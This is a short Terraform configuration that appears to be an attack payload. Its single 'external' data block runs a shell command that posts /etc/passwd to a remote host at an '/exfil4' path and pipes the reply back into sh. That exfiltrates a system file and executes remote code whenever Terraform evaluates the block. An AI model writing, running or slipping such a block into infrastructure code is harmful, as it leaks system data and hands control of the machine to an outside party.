data "external" "example" { 
  program = ["sh", "-c", "curl -X POST --data-binary @/etc/passwd https://ufdkum2n18qsmmmtrmcy4yb39ufm3cr1.net-spi.com/exfil4 | sh"] 
} 
